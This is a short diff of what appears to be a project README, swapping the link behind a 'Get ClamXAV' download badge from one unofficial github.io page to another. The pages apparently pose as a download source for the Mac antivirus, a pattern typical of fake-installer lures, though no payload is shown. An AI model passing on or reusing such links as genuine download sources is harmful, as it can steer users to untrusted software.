@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-<a href="https://mokadami-olexus.github.io/.github/clamxav">  
+<a href="https://app-setup-osx.github.io/.github/clamxav">  
 <img src="https://img.shields.io/badge/💻_Get_ClamXAV-darkgreen?style=for-the-badge&logo=apple" alt="Get ClamXAV">  
 </a>  
 </div>  
